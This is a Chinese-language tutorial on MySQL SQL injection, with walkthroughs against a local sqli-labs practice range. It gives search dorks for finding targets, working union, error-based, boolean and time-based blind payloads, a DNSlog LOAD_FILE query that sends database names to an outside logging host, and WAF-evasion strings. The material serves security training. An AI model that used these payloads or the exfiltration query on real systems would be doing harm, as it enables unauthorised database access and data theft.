# MySQLSQL注入


## <font color = #1E90FF>寻找SQL注入点</font>
* __无特定目标：__
		inurl:.php?id=
* __有特定目标__
		inurl:.php?id= site:target.com
- __工具爬取__
		spider---->对搜索引擎和目标网站的链接进行爬取

## <font color = #1E90FF>注入识别</font>
* __手工简单识别__
```mysql
	'
	and 1=1 / and 1=2
	and '1'='1 / and '1'='2
	and 1 like 1 / and 1 like 2 
```
* __工具识别__
```sqlmqp
sqlmap -m filename  --->(filename中保存着检测目标)
sqlmap --crawl ---->(sqlmap读目标网站进行爬取，然后依次测试)
```
## <font color = #1E90FF>SQL注入流程</font>
* __<font color = #FF0000>1.信息收集</font>__
</figure>
     <figure class="thumbnails">
        <img src="picture/SQLzhuru/2.png">
</figure>
* __<font color = #FF0000>2.获取数据</font>__
</figure>
     <figure class="thumbnails">
        <img src="picture/SQLzhuru/3.png">
</figure>

* __<font color = #FF0000>3.提取权限</font>__
</figure>
     <figure class="thumbnails">
        <img src="picture/SQLzhuru/4.png">
</figure>


## <font color = #1E90FF>万能密码登录案例</font>

- **登录SQL的语句**
```mysql
select*from admin where username = '用户输入的用户名' and passworld = '用户输入的密码'	
```
- **万能密码**

    ```
    ' or 1=1 --+	#永远为真

    --+             #注释掉后面的内容不再执行
    ```

## <font color = #1E90FF>注入提交方式</font>

- **get**
```
一般通过浏览器提交
```
- **post**
```
一般用于文件上传等
```
- **ASP:**
```asp
	request	                #全部接受
	request.querystring	    #接受get
	request.form	            #接受post
	request.cookie	        #接受cookie
```
- **PHP:**
```php
	$_REQUEST	    #全部接受
	$_GET$_POST	    #接受get
	$_COOKIE	    #接受cookie
```

## <font color = #1E90FF>整型注入</font>
- **判断是否有注入** <font color = #FF0000>（判断是否未严格校验）---->第一要素</font><BR>
	- 1）可控参数的改变是否能影响页面显示结果
	- 2）输入的SQL语句是否能报错----能通过数据库的报错，看到数据库的一些语句痕迹
	        select username，password from user where id =?'
	- 3）输入的SQL语句是否不报错----我们的语句能够成功闭合
- **2.什么类型的注入**
- **3.语句是否能够被恶意修改**<font color = #FF0000>----->第二要素</font><BR>
- **4.是否能够成功执行**<font color = #FF0000>----->第三要素</font><BR>
- **5.获取我们想要的数据**

### <font color = #FF0000>1.打开sqli靶场，在url后添加`'`号，报错</font><BR>
</figure>
     <figure class="thumbnails">
        <img src="picture/SQLzhuru/1.png">
</figure>

- 错误信息如下:
```
     check the manual that corresponds to your MySQL server version for the right syntax to use near '  '" LIMIT 0,1    ' at line 1
```
```mysql
     select username，password from user where id ='?''
```

- 可以看出多了个单引号，说明可能是 `id='?'`

### <font color = #FF0000>2.下面猜字段数</font><BR>
```
order by 数字       #猜字段数
如：
    order by  2
```
### <font color = #FF0000>3.爆表</font><BR>

## <font color = #1E90FF>union联合查询注入</font>

__<font color = #FF0000>1.union操作符用于合并两个或多个Select语句的结果集<BR>2.注意:union内部的select语句必须拥有相同数量的列。列也必须拥有相似的数据类型。通过手机。每条select语句中的列的顺序必须相同<BR>3.默认情况下，union操作符选取不同的值，如果允许重复的值，请使用union all</font>__

### union注入应用场景
- **1.只有最后一个select子句允许有order by**
- **2.只有最后一个select子句允许有limit**
- **3.只要union连接的几个查询的字段数一样且列的书类型转换没有问题，就可以查询出结果**
- **4.注入点页面有回显**

### union注入方法
**order by 猜出来的列数超过数据库表中的列数，报错并不能返回数据**

</figure>
     <figure class="thumbnails">
        <img src="picture/SQLzhuru/union注入方法.png">
</figure>

## <font color = #1E90FF>报错注入</font>

### <font color = #FF0000>原理</font><BR>
**构造payload让信息通过错误提示回显出来**
### <font color = #FF0000>应用场景:</font><BR>
**1.查询不回显内容，会打印错误信息<BR>2.Update，insert等语句，会打印错误信息**

### <font color = #FF0000>报错注入方法:</font><BR>
**凡是可以让错误信息显示的函数（语句），都能实现报错注入<BR>例:**

- **floor**
```mysql
floor()		--->select count(*) from information_schema.tables group by concat(select version()),floor(rand(0)*2);
group by 对rand()函数进行操作时产生错误
```

- **extractvalue()**
```mysql
extractvalue()	--->extractvalue(1,concat(0x7e,(select user()),0x7e));
Xpath语法错误产生报错
```

- **updatexml()**
```mysql
updatexml()	--->select updatexml(1,concat(0x7e,(select user()),0x7e),1);
Xpath语法错误产生报错
```

## <font color = #1E90FF>布尔盲注</font>
### <font color = #FF0000>原理</font><BR>
**代码存在SQL注入漏洞，然而页面不会回显数据，也不会回显错误信息<BR>只返回“Right”与“Wrong”<BR>这里我们可以通过构造语句，来判断数据库信息的正确性，在通过页面的‘真’和’假‘来识别我们的判断是否正确，这就是布尔盲注**

### <font color = #FF0000>布尔盲注方法:</font><BR>
**构造逻辑判断语句，判断信息的真假，取出所有的真值，实现SQL注入**
- **left函数**
	- **left(a,b)<BR>从左截取a的前b位**
```mysql
left(database(),1)>'s'
database()显示数据库名称，left(a,b)从左截取a的前b位
```

- **regexp**
	- **regexp<BR>正则表达式**
```mysql
select user() regexp '^r'
user的结果为root,regexp为匹配root的正则表达式
```

- **like**
	- **与regexp相似**
```mysql
select user() like 'ro%'
使用like进行匹配
```

- **substr()函数，ascii()函数**
	- **substr(a,b,c)<BR>从b的位置开始，截取字符串a的c长度**
	- **ascii()将摸个字符转为ascill值**
```mysql
ascii(substr(select database()),1,1))=98
```

- **ordr()函数，mid()函数**
	- **mid(a,b,c)<BR>从b的位置开始，截取字符串a的c长度**
	- **ascii()将摸个字符转为ascill值**

```mysql
ord(substr(select database()),1,1))=114
```

### <font color = #FF0000>布尔盲注实验:</font><BR>
**环境：sqli靶场第8关**

- **1.在url后方添加?id=1,界面正常**
	- **在后方添加 and 1='1页面异常**
		```
		1. http://192.168.2.149:86/Less-8/?id=1
		2. http://192.168.2.149:86/Less-8/?id=1 and 1='1
		```
</figure>
     <figure class="thumbnails">
        <img src="picture/SQLzhuru/布尔盲注1.png">
</figure>

- **2.通过1判断出有注入点之后，在后方加入' and left(database(),1)='s' --+ 构造闭环**
	- **界面正常**
		```
		http://192.168.2.149:86/Less-8/?id=1' and left(database(),1)='s' --+

		```

- **3.构造语句判断当前数据库的第一个表的第一个字符（可以使用bp抓包来获取全部字符）**
	- **界面正常说明猜测的字母正确**
		```
		http://192.168.2.149:86/Less-8/?id=1' and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='e' --+
		```
- **4.通过burp来获取全部字段**
	- **4.1 打开代理，和burp开始抓包，并把包发送到ntruder模块**
	- **4.2 把需要设着的值设为变量**
	- **4.3 在positins模块中把需要的值add一下**
	- **4.4 在payload模块中选泽类型，和最大最小位数**
	- **4.5 设置完成后点击右上角start attack**
     <figure class="thumbnails">
        <img src="picture/SQLzhuru/布尔盲注2.png">
		<img src="picture/SQLzhuru/布尔盲注3.png">
	</figure>

- **4.可以根据长度开判断是否正确**
	- **打开下面的response模块发现出现 you are in !!说明这个字段是正确的**
	<figure class="thumbnails">
        <img src="picture/SQLzhuru/布尔盲注4.png">

	</figure>

- **5.可以修改limit 来查询第二张表，过程与上方相似，不做重复演示**
	
## <font color = #1E90FF>时间盲注</font>
### <font color = #FF0000>原理</font><BR>
**代码存在SQL注入漏洞<BR>然而页面既不会回显数据，也不会回显错误信息<BR>语句执行后也不提示真假，我们不能通过页面的内容来进行判断<BR>这里可以通过构造语句。通过页面响应的时长，来判断信息，这就是时间盲注**

### <font color = #FF0000>时间盲注方法</font><BR>
* **核心语法:**
```mysql
if ( left( user(),1 )='a',0,sleep(3) );
```
<figure class="thumbnails">
    <img src="picture/SQLzhuru/时间盲注1.png">

</figure>

* **真实场景:**
```
if( ascii( substr(database(),1,1) )>115,0,sleep(5) )
```
<figure class="thumbnails">
    <img src="picture/SQLzhuru/时间盲注2.png">
</figure>

### <font color = #FF0000>时间盲注实验:</font><BR>
**环境：sqli靶场第10关**

 - **1.在url后方添加?id=1,界面正常**
	- **在后方添加逻辑判断，发现页面无反应**
	- **在后方加入 下方语句，然后F12发现响应时间变成了4s,说明左侧第一位不是a**
	```
	http://192.168.2.149:86/Less-10/?id=1" and  if(left(user(),1)='a',0,sleep(3)) --+
	```
	<figure class="thumbnails">
    <img src="picture/SQLzhuru/时间盲注3.png">
	</figure>
 - **2.可以通过这种方式一位一位的来进行判断**

 ## <font color = #1E90FF>Dnslog盲注</font>
 ### <font color = #FF0000>原理</font><BR>
 __代码存在SQL注入漏洞<BR>然而页面即不会回显数据，也不会回显错误信息<BR>我们通过布尔或者时间盲注都可以获取到内容，但整个过程效率低，需要发送很多的请求进行判断，很可能会触发安全设备的防护<BR>我们需要一种方式，减少请求，直接回显数据，这里可以使用Dnslog实现注入__
<figure class="thumbnails">
	<img src="picture/SQLzhuru/dnslog注入1.png">
</figure>

 - **Dnslog平台:**
	- **DNS在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息**
	```
	http://ceye.io  # Dnslog平台
	```
	<figure class="thumbnails">
	<img src="picture\SQLzhuru\dnslog盲注2.png">
	</figure>

- **mysql LOAD_FILE函数可以发起请求**

### <font color = #FF0000>Dnslof盲注方法</font><BR>
**构造语句，利用load_file()函数发起请求，使用Dnslog接受请求，获取数据**

```
核心语法:
select LOAD_FILE(CONCAT('\\\\',(select database()),'.mysql.xxxx.ceye.io\\abc'));
```
<figure class="thumbnails">
<img src="picture\SQLzhuru\Dnslog盲注3.png">
</figure>

### <font color = #FF0000>Dnslog盲注实验:</font><BR>
* __1.打开Navicat，找任意数据库，执行上面语句__
```
select LOAD_FILE(CONCAT('\\\\',(select database()),'.mysql.xxxx.ceye.io\\abc'));
```
* __2.打开ceye.io下面的DNS Query栏中可以看到当前数据库名已经显示出来了__

<figure class="thumbnails">
<img src="picture\SQLzhuru\Dnslog盲注4.png">
<img src="picture\SQLzhuru\Dnslog盲注5.png">
</figure>

## <font color = #1E90FF>宽字节注入</font>
### <font color = #FF0000>宽字节注入原理</font><BR>
- **什么叫做宽字节？**
	- **简单来说，其大小为一个字节的就叫窄字节，为2个字节的就叫宽字节，英文默认1个字节，中文默认2个字节**
	<figure class="thumbnails">
	<img src="picture\SQLzhuru\宽字节注入1.png">
	<img src="picture\SQLzhuru\宽字节注入2.png">
	</figure>
	
### <font color = #FF0000>宽字节注入方法</font><BR>
- **方法:**
	- **在注入点后键入%df ,然后按照正常的注入流程开始注入**
	```
	http://192.168.2.149:86/Less-32/?id=%df'  union select 1,2,3 --+
	```
- **黑盒测试**
	- **在可能的注入点后键入%df ,之后进行注入测试**
- **白盒测试**
	- **1.查看MYSQL编码是否为gbk**
	- **2.是否使用preg_replace吧单引号替换成\\'**
	- **3.是否使用addslashes进行转义**
	- **4.是否使用mysql——real_escape_string进行转义**

### <font color = #FF0000>宽字节注入实验:</font><BR>
**环境：sqli靶场第32关**
- **1.在url后方添加?id=1,界面正常**
	- **在后方添加 and 1='1页面正常**
	- **在后方添加 hid=%df1 and 1='1页面异常，判断'号被转义**
	
		```
		1. http://192.168.2.149:86/Less-8/?id=1
		2. http://192.168.2.149:86/Less-32/?id=%df1 and 1='1
		```
	<figure class="thumbnails">
	<img src="picture\SQLzhuru\宽字节注入3.png">
	</figure>
- **2.下面按照正常的注入流程来就可以了**

## <font color = #1E90FF>二次编码注入</font>
### <font color = #FF0000>原理</font><BR>
- **宽字节和二次编码注入:<BR>是在面对PHP代码或配置，对输入的`'`(单引号)进行转义的时候，在处理用户输入数据时存在问题，可以绕过转义**
 	<figure class="thumbnails">
	<img src="picture\SQLzhuru\二次编码注入1.png">
	</figure>	

- **%2527讲解:**
	- **1. 先将%25转义为%号,变成了%27**
	- **2. %27又变转义成了'号，就形成了注入点**

## <font color = #1E90FF>二次注入</font>
### <font color = #FF0000>原理</font><BR>
- **二次注入原理主要分两步:**
	- **1.插入恶意数据**
		- **第一次进行数据库插入数据点时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还保留了原来的数据，但是数据本身包含恶意内容**
	- **2.引用恶意数据**
		- **在将数据引入到了数据库中之后，开发者就认为数据是可信的，在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就形成了SQL的二次注入**
	<figure class="thumbnails">
	<img src="picture\SQLzhuru\二次注入1.png">
	</figure>	

## <font color = #1E90FF>WAF绕过原理及分析</font>
__熟练掌握MYSQL函数和语法使用方法+深入了解中间件运行处理机制+了解WAF防护原理及方法=随心所欲的绕过WAF防护__

### <font color = #FF0000>黑盒绕过</font><BR>
- **一.架构层绕过WAF**
	- **1.寻找源站--->针对云WAF**
	- **2.利用同网段--->绕过WAF防护区域**
	- **3.利用边界漏洞--->绕过WAF防护区域**
- **二.资源限制角度绕过WAF**
	- **1.post大BODY**
- **三.协议层面绕过WAF**
	- **1.协议未覆盖绕过WAF**
		- **请求方式变更:GET--->POST**
		- **Content-Type变换:application/x-www-from-urlencoded;--->multipart/form-data;**
	- **2.参数污染**
- **四.规则层面绕过WAF（主要的绕过方式）**
	- **1.SQL注释符绕过**
	```
	① Level-1: union/**/select
	② Level-2: union/*aaaa%01bbs*/select
	③ Level-3： union/*aaaaaaaaaa*/select
	④ 内连注释: /*!xx*/
	```
	- **2.空白符绕过**
	```
	① MYSQL空白符: %09,%0A.%0D.%20.%0C.%A0./**/
	② 正则的空白符: %09,%0A.%0D.%20
	例1: union %250Cselect
	例2: union %25A0select
	```	
	- **3.函数分隔符**
	```
	① concat%2520()
	② concat/**/()
	③ concat%250c()
	④ concat%25a0()
	```		
	- **4.浮点数词法解析**
	```
	① select * from users where id=8E0 union select 1,2,3,4
	② select * from users where id=8.0 union select 1,2,3,4
	③ select * from users where id=\Nunion union select 1,2,3,4
	```		
	- **5.利用error-based进行SQL注入:Error-based SQL注入函数非常容易被忽略**
	```
	① extractvalue(1,concat(0x5c,md5(3)));
	② updatexml(1,concat(0x5c,md5(3)),1);
	③ GeometryCollection((select * from (select * from (select@@version)f)x))
	④ polygon((select * from (select name_const(version(),1))x))
	⑤ linestring()
	⑥ multipoint()
	⑦ multilinestring()
	⑧ multipolygon()
	```		
	- **6.Mysql特殊语法**
	```
	① select {x table_name} from {x information_schema.tables};

	```		

### <font color = #FF0000>Fuzz绕过WAF</font><BR>
**每一个点都能找到绕过的方法<BR>以注释绕过为例子，开始Fuzz**
<figure class="thumbnails">
<img src="picture\SQLzhuru\注释符绕过.png">
</figure>